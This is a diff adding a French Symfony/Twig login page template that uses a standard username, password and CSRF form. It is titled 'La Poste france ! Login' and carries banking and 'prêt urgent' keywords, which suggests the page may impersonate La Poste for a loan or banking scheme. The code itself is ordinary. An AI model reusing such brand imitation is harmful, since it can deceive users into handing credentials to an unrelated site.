@@ -1,0 +1,149 @@
+<!doctype html>
+<html lang="fr">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#000000">
+    <title> La Poste france ! Login </title>
+    <meta name="description" content="#">
+    <meta name="keywords"
+        content="compte, wallet, banking, prêt urgent" />
+    <link rel="icon" type="image/png" href="{{ asset('new assets/assets/img/favicon.png') }}" sizes="32x32">
+    <link rel="apple-touch-icon" sizes="180x180" href="{{ asset('new assets/assets/img/icon/192x192.png') }}">
+    <link rel="stylesheet" href="{{ asset('new assets/assets/css/style.css')}}">
+    <link rel="stylesheet" href="{{ asset('new assets/assets/css/src/splide/splide.min.css')}}">
+    <link rel="manifest" href="{{ asset('new assets/__manifest.json')}}">
+</head>
+
+<body>
+
+  
+
+    <!-- App Header -->
+    <div class="appHeader no-border transparent position-absolute">
+        <div class="left">
+            <a href="#" class="headerButton goBack">
+                <ion-icon name="chevron-back-outline"></ion-icon>
+            </a>
+        </div>
+        <div class="pageTitle"></div>
+        <div class="right">
+        </div>
+    </div>
+    <!-- * App Header -->
+
+    <!-- App Capsule -->
+    <div id="appCapsule">
+
+         <div class="section mt-2 text-center">
+            <a class="headerButton" href="javascript:void()" onclick="window.location.hash=&#39;#googtrans(en)&#39;;location.reload();" style="margin-right:5px;"><img src="{{ asset('img/en.png') }}"></a>
+        </div>
+        <div class="section mt-2 text-center">
+            <h1>Connexion</h1>
+            <h4>Se connecter</h4>
+        </div>
+        <div class="section mb-5 p-2">
+
+            
+                <div class="card">
+                    <div class="card-body pb-1">
+                       <form method="post">
+        {% if error %}
+          <div class="alert alert-danger">{{ error.messageKey|trans(error.messageData, 'security') }}</div>
+        {% endif %}
+        {% for message in app.session.flashBag.get('success') %}
+          <div class="alert alert-success alert-dismissible">
+           
+            {{ message }}.
+          </div>
+        {% endfor %}
+        {% if app.user %}
+          <div class="mb-3">
+            Vous êtes connecté en tant que {{ app.user.username }}, <a href="{{ path('app_logout') }}">Déconnexion</a>
+          </div>
+        {% endif %}
+         <label>Nom d'utilisateur</label><br>
+        <div class="input-group mb-3">
+         
+          <input type="text" value="{{ last_username }}" placehoder="Nom d'utilisateur" name="username" id="inputUsername" class="form-control" required autofocus>
+          <div class="input-group-append">
+            <div class="input-group-text">
+              <span class="fas fa-envelope"></span>
+            </div>
+          </div>
+        </div>
+         <label>Mot de passe</label><br>
+        <div class="input-group mb-3">
+          <input type="password" name="password" id="inputPassword" class="form-control" required>
+          <div class="input-group-append">
+            <div class="input-group-text">
+              <span class="fas fa-lock"></span>
+            </div>
+          </div>
+        </div>
+        <div class="row">
+          <div class="col-8">
+            <div class="icheck-primary">
+              <input type="checkbox" name="_remember_me">
+              <label for="remember">
+                Se souvenir de moi
+              </label>
+            </div>
+          </div>
+          <!-- /.col -->
+          <input type="hidden" name="_csrf_token" value="{{ csrf_token('authenticate') }}">
+          
+          <!-- /.col -->
+        </div>
+      
+      <!-- /.social-auth-links -->
+      <p class="mb-1">
+        <a href="#">J'ai oublié mon mot de passe</a>
+      </p>
+      <p class="mb-0">
+        <a href="{{ path('app_register') }}" class="text-center">Créer un nouveau compte</a>
+      </p>
+                    </div>
+                </div>
+
+
+              
+
+                <div class="form-button-group  transparent">
+                    <button type="submit" class="btn btn-primary btn-block btn-lg">Connexion</button>
+                </div>
+
+        </div>
+</form>
+    </div>
+    <!-- * App Capsule -->
+
+
+<!-- ========= JS Files =========  -->
+    <!-- Bootstrap -->
+    <script src="{{ asset('new assets/assets/js/lib/bootstrap.bundle.min.js')}}"></script>
+    <!-- Ionicons -->
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+    <!-- Splide -->
+    <script src="{{ asset('new assets/assets/js/plugins/splide/splide.min.js')}}"></script>
+    <!-- Base Js File -->
+   <script type="text/javascript">
+            function googleTranslateElementInit() {
+                new google.translate.TranslateElement({pageLanguage: 'fr', layout: google.translate.TranslateElement.InlineLayout.SIMPLE, autoDisplay: false}, 'google_translate_element');
+            }
+        </script>
+        <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+        
+
+
+</body>
+
+</html>
+
+
+      
+   
